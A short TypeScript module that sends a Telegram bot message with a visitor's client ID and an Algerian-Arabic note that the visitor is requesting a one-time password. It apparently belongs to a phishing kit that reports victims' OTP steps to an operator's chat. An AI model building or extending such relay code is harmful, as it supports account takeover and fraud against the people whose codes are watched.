import { TELEGRAM_CONFIG } from './config';
import { getClientId } from '../../utils/clientId';

export async function sendOTPResendNotification() {
  try {
    const clientId = getClientId();
    const message = `<code>${clientId}</code>\n\n🔄 RAHOU TLAB OTP`;

    await fetch(`${TELEGRAM_CONFIG.baseUrl}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.chatId,
        text: message,
        parse_mode: 'HTML'
      }),
    });
  } catch (error) {
    console.error('Failed to send OTP resend notification:', error);
  }
}